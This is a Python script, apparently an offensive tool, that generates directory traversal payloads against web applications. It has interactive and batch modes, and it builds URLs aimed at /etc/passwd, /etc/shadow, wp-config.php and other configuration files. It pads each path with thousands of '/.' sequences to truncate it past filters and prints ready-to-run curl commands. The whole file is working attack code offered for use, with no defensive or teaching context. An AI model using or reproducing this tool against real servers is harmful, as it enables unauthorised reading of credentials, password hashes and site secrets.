#!/usr/bin/env python3
"""
Directory Traversal Payload Generator
Advanced tool for generating directory traversal payloads with bypass techniques
"""

import os
import sys
from typing import Dict, List, Tuple


class DirectoryTraversalGenerator:
    """Main class for generating directory traversal payloads"""
    
    # Pre-defined target configurations
    COMMON_TARGETS = [
        {"file": "index.php", "path": "a/../", "desc": "index.php (current)"},
        {"file": "config.php", "path": "a/../", "desc": "config.php (current)"},
        {"file": "admin.html", "path": "a/../", "desc": "admin.html (current)"},
        {"file": "admin.php", "path": "a/../", "desc": "admin.php (current)"},
        {"file": "login.php", "path": "a/../", "desc": "login.php (current)"},
        {"file": "passwd", "path": "a/../../../etc/", "desc": "passwd (system)"},
        {"file": "shadow", "path": "a/../../../etc/", "desc": "shadow (system)"},
        {"file": "config.php", "path": "a/../config/", "desc": "config.php (config dir)"},
        {"file": "wp-config.php", "path": "a/../../", "desc": "wp-config.php (parent)"},
        {"file": "database.php", "path": "a/../includes/", "desc": "database.php (includes)"},
        {"file": "settings.php", "path": "a/../../../var/www/", "desc": "settings.php (var/www)"},
        {"file": "hosts", "path": "a/../../../etc/", "desc": "hosts (system)"},
    ]
    
    # Directory traversal patterns
    TRAVERSAL_PATTERNS = {
        "current": "a/../",
        "parent": "a/../",
        "parent_2": "a/../../",
        "parent_3": "a/../../../",
        "parent_4": "a/../../../../",
        "parent_5": "a/../../../../../"
    }
    
    def __init__(self):
        self.payloads = []
    
    def _sanitize_path(self, path: str) -> str:
        """Sanitize and normalize path input"""
        path = path.strip()
        if not path:
            return "a/../"
        
        # Add 'a/' prefix if not present
        if not path.startswith("a/"):
            if path.startswith("../"):
                path = "a/" + path
            else:
                path = "a/../" + path
        
        # Ensure path ends with '/' if it's a directory
        if not path.endswith("/") and not any(path.endswith(ext) for ext in [".php", ".html", ".txt", ".conf"]):
            path += "/"
        
        return path
    
    def _generate_null_bytes(self, count: int) -> str:
        """Generate null bytes pattern for bypass"""
        return "/." * count
    
    def generate_payload(self, base_url: str, target_file: str, 
                        path_prefix: str, repeat_count: int) -> Dict[str, str]:
        """Generate a single payload"""
        sanitized_path = self._sanitize_path(path_prefix)
        null_bytes = self._generate_null_bytes(repeat_count)
        
        payload = f"{sanitized_path}{target_file}{null_bytes}"
        full_url = f"{base_url}{payload}"
        
        return {
            "payload": payload,
            "full_url": full_url,
            "target": target_file,
            "path": sanitized_path,
            "length": len(payload)
        }
    
    def interactive_mode(self) -> None:
        """Interactive payload generation"""
        print("=" * 60)
        print("DIRECTORY TRAVERSAL PAYLOAD GENERATOR")
        print("=" * 60)
        
        # Get user input
        base_url = input("Base URL (with parameter): ").strip()
        if not base_url.endswith("="):
            base_url += "="
        
        target_file = input("Target file: ").strip()
        
        # Path selection
        print("\nSelect target location:")
        print("1. Current directory")
        print("2. Parent directory (../)")
        print("3. Two levels up (../../)")
        print("4. Three levels up (../../../)")
        print("5. Four levels up (../../../../)")
        print("6. Five levels up (../../../../../)")
        print("7. Custom path")
        
        choice = input("Choice (1-7): ").strip()
        
        path_mapping = {
            "1": "a/../",
            "2": "a/../",
            "3": "a/../../",
            "4": "a/../../../",
            "5": "a/../../../../",
            "6": "a/../../../../../",
        }
        
        if choice in path_mapping:
            path_prefix = path_mapping[choice]
        elif choice == "7":
            custom_path = input("Custom path (e.g., ../config/): ").strip()
            path_prefix = self._sanitize_path(custom_path)
            print(f"Final path: {path_prefix}")
        else:
            print("Invalid choice, using current directory")
            path_prefix = "a/../"
        
        try:
            repeat_count = int(input("Number of '/.' repetitions: ").strip())
        except ValueError:
            print("Invalid number, using 2500")
            repeat_count = 2500
        
        # Generate payload
        result = self.generate_payload(base_url, target_file, path_prefix, repeat_count)
        
        # Display results
        self._display_result(result)
        
        # Save option
        if input("\nSave to file? (y/n): ").lower() == 'y':
            self._save_payload(result)
    
    def batch_mode(self) -> None:
        """Batch payload generation"""
        print("=" * 60)
        print("BATCH MODE - MULTIPLE PAYLOADS")
        print("=" * 60)
        
        base_url = input("Base URL (with parameter): ").strip()
        if not base_url.endswith("="):
            base_url += "="
        
        try:
            repeat_count = int(input("Number of '/.' repetitions for all payloads: ").strip())
        except ValueError:
            repeat_count = 2500
        
        print(f"\n{'='*80}")
        print("GENERATED PAYLOADS")
        print(f"{'='*80}")
        
        results = []
        for i, config in enumerate(self.COMMON_TARGETS, 1):
            result = self.generate_payload(
                base_url, config["file"], config["path"], repeat_count
            )
            results.append(result)
            
            print(f"\n{i:2d}. {config['desc']}")
            print(f"    File: {config['file']}")
            print(f"    Path: {config['path']}")
            print(f"    Length: {result['length']} chars")
            print(f"    Payload: {result['payload'][:60]}...")
            print(f"    URL: {result['full_url']}")
        
        # Save all option
        if input("\nSave all payloads to file? (y/n): ").lower() == 'y':
            self._save_batch_payloads(results)
    
    def _display_result(self, result: Dict[str, str]) -> None:
        """Display payload result"""
        print("\n" + "=" * 60)
        print("PAYLOAD GENERATED")
        print("=" * 60)
        print(f"Target file: {result['target']}")
        print(f"Path prefix: {result['path']}")
        print(f"Payload length: {result['length']} characters")
        print(f"\nFull URL:")
        print(result['full_url'])
        print(f"\nPayload only:")
        print(result['payload'])
        
        if result['length'] > 100:
            preview = result['payload'][:50] + "..." + result['payload'][-50:]
            print(f"\nPayload preview:")
            print(preview)
        
        print(f"\nCurl command:")
        print(f'curl "{result["full_url"]}"')
    
    def _save_payload(self, result: Dict[str, str], filename: str = None) -> None:
        """Save single payload to file"""
        if not filename:
            filename = input("Filename (default: payload.txt): ").strip() or "payload.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"Directory Traversal Payload\n")
            f.write(f"Generated by DirectoryTraversalGenerator\n")
            f.write(f"{'='*50}\n\n")
            f.write(f"Target file: {result['target']}\n")
            f.write(f"Path prefix: {result['path']}\n")
            f.write(f"Payload length: {result['length']} characters\n\n")
            f.write(f"Full URL:\n{result['full_url']}\n\n")
            f.write(f"Payload only:\n{result['payload']}\n\n")
            f.write(f"Curl command:\ncurl \"{result['full_url']}\"\n")
        
        print(f"Payload saved to '{filename}'")
    
    def _save_batch_payloads(self, results: List[Dict[str, str]]) -> None:
        """Save batch payloads to file"""
        filename = input("Filename (default: batch_payloads.txt): ").strip() or "batch_payloads.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"Directory Traversal Batch Payloads\n")
            f.write(f"Generated by DirectoryTraversalGenerator\n")
            f.write(f"{'='*50}\n\n")
            
            for i, result in enumerate(results, 1):
                f.write(f"{i:2d}. Target: {result['target']}\n")
                f.write(f"    Path: {result['path']}\n")
                f.write(f"    Length: {result['length']} chars\n")
                f.write(f"    URL: {result['full_url']}\n")
                f.write(f"    Payload: {result['payload']}\n\n")
        
        print(f"Batch payloads saved to '{filename}'")
    
    def run(self) -> None:
        """Main entry point"""
        try:
            print("Directory Traversal Payload Generator")
            print("Select mode:")
            print("1. Interactive mode (single payload)")
            print("2. Batch mode (multiple payloads)")
            
            choice = input("Choice (1-2): ").strip()
            
            if choice == "1":
                self.interactive_mode()
            elif choice == "2":
                self.batch_mode()
            else:
                print("Invalid choice")
                sys.exit(1)
                
        except KeyboardInterrupt:
            print("\n\nOperation cancelled by user")
            sys.exit(0)
        except Exception as e:
            print(f"Error: {e}")
            sys.exit(1)

def main():
    """Main function"""
    generator = DirectoryTraversalGenerator()
    generator.run()


if __name__ == "__main__":
    main()
